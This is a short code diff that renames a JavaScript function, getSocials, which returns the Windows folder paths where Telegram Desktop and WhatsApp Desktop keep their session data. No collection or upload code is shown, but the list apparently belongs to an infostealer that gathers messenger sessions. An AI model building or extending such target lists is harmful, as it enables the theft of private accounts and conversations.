@@ -1,4 +1,4 @@
-const getSocials = () => {
+const GetSocials = () => {
     return {
         'Telegram Desktop':            'AppData\\Roaming\\Telegram Desktop\\tdata',
         'WhatsApp Desktop':            'AppData\\Roaming\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState',
@@ -25,5 +25,5 @@ const getSocials = () => {
 };
 
 module.exports = {
-    getSocials,
+    GetSocials,
 };
